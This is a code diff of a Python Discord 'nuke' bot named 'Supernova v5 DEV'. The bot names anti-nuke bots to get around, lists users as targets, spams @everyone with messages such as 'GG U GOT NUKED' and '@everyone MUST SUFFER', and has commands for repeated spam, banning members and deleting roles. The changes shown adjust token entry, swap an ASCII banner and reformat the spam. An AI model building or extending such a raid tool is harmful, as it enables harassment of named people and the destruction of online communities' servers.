@@ -22,9 +22,9 @@ print("Defining varibles...")
 intents = discord.Intents().all()
 ver = "Supernova v5 DEV"
 bot = commands.Bot(command_prefix=">")
-#token = sd.askstring(ver, "Enter token:")
+token = sd.askstring(ver, "Enter token:")
 #BELOW VARIBLE IS FOR DEV ONLY!! UNCOMMENT IF YOU ARE MODIFIYING THIS CODE!
-token = "token"
+#token = "TOKEN HERE"
 ANTI_NUKES = ["Protection X#1252", "Security#1120", "Wick#3938"]
 TARGETS = ["Snipe#1460", "Frauder#0724", "KingofShadows#4639", "sachiko#6354"]
 TRUSTED = ["Nothecker#8491", "The_SysKill#1878", "Dragoblade#3001"]
@@ -38,17 +38,13 @@ SPAM_MESSAGE = ["""```ansi
    [2;45m          [0m       [2;45m  [0m     [2;45m  [0m         [2;31m|[0m[2;35m                5555555[0m
 [2;40m[0m
 ```""","@everyone You Got Blown up with %s" % ver, "CODE Written By Sys, @everyone MUST SUFFER, \n","@everyone MUST LEARN CODING OR ELSE", "Frauder is a fraud, idk why i put this here, probably coz its true.","GG U GOT NUKED"]
-SYS_IS_GOD = """```ansi
-[2;45m[2;33m[2;40mSYSKILL IS GOD! SYSKILL IS GOD! SYSKILL IS GOD! SYSKILL IS GOD!
-                    [2;41m         [0m[2;33m[2;40m    [2;41m  [0m[2;33m[2;40m   [2;41m  [0m[2;33m[2;40m    [2;41m          [0m[2;33m[2;40m         
-                  [2;41m  [0m[2;33m[2;40m               [2;41m   [0m[2;33m[2;40m    [2;41m  [0m[2;33m[2;40m                   
-[1;33mRESPECT OR ELSE!   [1;41m          [0m[1;33m[1;40m       [1;41m [0m[1;33m[1;40m      [1;41m           [0m[1;33m[1;40m         
-                            [1;41m  [0m[1;33m[1;40m      [1;41m [0m[1;33m[1;40m                [1;41m  [0m[1;33m[1;40m        
-                   [1;41m          [0m[1;33m[1;40m       [1;41m [0m[1;33m[1;40m      [1;41m           [0m[1;33m[1;40m         
-                                                               
-                                                               
-                                                               
-                                                               [1;41m[0m[1;33m[1;40m[0m[2;33m[2;40m[0m[2;33m[2;45m[0m[2;45m[0m
+SUPERNOVA_MESSAGE = """```ansi
+[2;40m[2;31m[2;35m[0m[2;31m[2;40m[1;31m ____                                              [1;33m[1;33m __     ______  [0m[1;33m[1;40m[0m[1;31m[1;40m
+/ ___| _   _ _ __   ___ _ __ _ __   _____   ____ _ [1;33m[1;33m \ \   / / ___| [0m[1;33m[1;40m[0m[1;31m[1;40m
+\___ \| | | | '_ \ / _ \ '__| '_ \ / _ \ \ / / _` | [1;33m \ \ / /|___ \ [0m[1;31m[1;40m
+ ___) | |_| | |_) |  __/ |  | | | | (_) \ V / (_| | [1;33m  \ V /  ___) |[0m[1;31m[1;40m
+|____/ \__,_| .__/ \___|_|  |_| |_|\___/ \_/ \__,_|   [1;33m \_/  |____/ [0m[1;31m[1;40m
+            |_|                                                    [0m[2;31m[2;40m[0m[2;40m[0m
 ```"""
 
 #DEVELOPER TOOLS
@@ -368,7 +364,7 @@ async def fun(ctx, *,spamstuff=None):
         response = discord.Embed(title="Error", description="Wopps, you didnt specify what fun you want!", color=0xff0033)
         await ctx.send(embed=response)
     else:
-        await ctx.send(" "+spamstuff*30)
+        await ctx.send((" "+spamstuff+" ")*30)
 
 @client.command(help="Banner Hammer")
 async def ban(ctx, member : discord.Member, *, reason = "Outta here nerd, Banned by %s" % ver):
@@ -387,6 +383,8 @@ async def ban(ctx, member : discord.Member, *, reason = "Outta here nerd, Banned
 async def error(ctx, error): # This might need to be (error, ctx), I'm not sure
     if isinstance(error, discord.ext.commands.MemberNotFound):
         await ctx.send(embed=discord.Embed(title="Ban", description="I could not find that user.", color=0xff000f))
+
+
 
 @bot.command(help="Does what it says on the tin")
 async def del_roles(ctx):
